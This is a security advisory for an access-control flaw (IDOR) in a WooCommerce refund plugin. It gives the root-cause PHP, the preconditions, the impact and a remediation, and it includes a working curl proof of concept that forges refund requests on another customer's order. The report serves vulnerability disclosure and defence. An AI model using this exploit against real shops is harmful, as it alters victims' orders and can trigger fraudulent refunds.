# FR-01 — IDOR: an authenticated customer can create refund requests on other customers' orders

- **Plugin:** Flexible Refund and Return Order for WooCommerce (free) — slug `flexible-refund-and-return-order-for-woocommerce`
- **Vendor:** WP Desk
- **Affected:** 1.0.51 – 2.0.3 (latest at time of writing; unfixed in trunk)
- **Tested:** 2.0.3 · WordPress 7.1.2 · WooCommerce 11.1.2 (HPOS on & off)
- **Class:** Broken Access Control / IDOR — CWE-862
- **Privileges:** authenticated, any Customer with one order
- **CVSS 3.1:** 4.3 `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
- **Evidence:** [`evidence/trace.txt`](evidence/trace.txt) · **PoC:** [`poc/poc.sh`](poc/poc.sh)

## What the bug is, in one paragraph

When a customer submits a refund request, the plugin decides "are you allowed to touch this
order?" in two ways. The first is the correct one: *the order belongs to you*. The second is a
"public request" shortcut, added in 1.0.51 for the PRO guest-checkout feature, that says *you
are allowed if the URL carries this order's ID and the order's billing email*. The PRO-only form
that normally drives that second path is hidden in the free plugin, but the code that **processes**
it still runs. So any logged-in customer can take their own valid form token and submit a refund
request pointed at **someone else's** order.

## Root cause

`vendor_prefixed/wpdesk/flexible-refunds-core/src/Integration/MyAccount.php`,
`save_refund_request()` (hook `wp`, prio 999):

```php
// lines 377-385
$is_authorized = $order->get_customer_id() === get_current_user_id();   // (A) ownership
if (!$is_authorized) {
    $is_authorized = $this->is_public_refund_request_authorized($order); // (B) "public" path — not gated to PRO
}
if (!$is_authorized) { return; }
```

`is_public_refund_request_authorized()` (lines 315-319) resolves the order from the attacker's
own GET parameters (`refund_order_id`, `refund_email`). The lookup
(`OrderReferenceResolver::find_order()`) gates only on
`hash_equals($order->get_billing_email(), $_GET['refund_email'])`. The required
`fr_refund_request_send` nonce (line 368) is bound to the **user**, not the order — so the
attacker mints it from their own refund form and reuses it against any order.

## Preconditions

Authenticated Customer with one own order (to mint the nonce). Knowledge of the target order's
ID (sequential), its billing email (the `hash_equals` gate), and one order-item ID (small
integer). No admin rights, no PRO.

## Proof of concept

```bash
# 1) attacker reads OWN order form -> copies the per-user nonce
NONCE=$(curl -s -b attacker.cookies \
  'http://TARGET/my-account/fr-refund/<OWN_ORDER>/?form_id=1' \
  | grep -oE 'fr_refund_request\]" value="[a-f0-9]+"' | grep -oE '[a-f0-9]+"$' | tr -d '"')

# 2) forge a request on the VICTIM order (not owned by attacker)
curl -s -b attacker.cookies -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' \
  "http://TARGET/?send_public_refund=1&refund_order_id=<VICTIM_ORDER>&refund_email=<VICTIM_EMAIL>" \
  --data-urlencode "fr_refund_form[items][<VICTIM_ITEM_ID>][qty]=1" \
  --data-urlencode 'fr_refund_form[form_id]=1' \
  --data-urlencode "fr_refund_form[fr_refund_request]=$NONCE"
```

**Result:** `302 ...&request=send`; a new row appears in `wp_fr_requests` for the victim order
(`status=requested`) and the victim's order status changes to `wc-refund-request`.
**Negative control:** a wrong `refund_email` returns HTTP 200 and creates no row — confirming the
email is the only gate. Full trace: [`evidence/trace.txt`](evidence/trace.txt).

## Impact

Forged refund requests on arbitrary orders enter the shop's refund queue and send notification
emails; the victim's order status is changed and the victim is blocked from filing their own
request. With PRO + auto-approval the forged request is auto-approved and a monetary refund is
issued for another customer's order. This reintroduces the impact of CVE-2025-10570 (fixed in
1.0.39) through a different, ungated code path.

## Remediation

Gate the public branch of `save_refund_request()` behind `Integration::is_super()` so the free
build only honors the ownership path, or bind the `fr_refund_request_send` nonce to the specific
order ID being refunded.
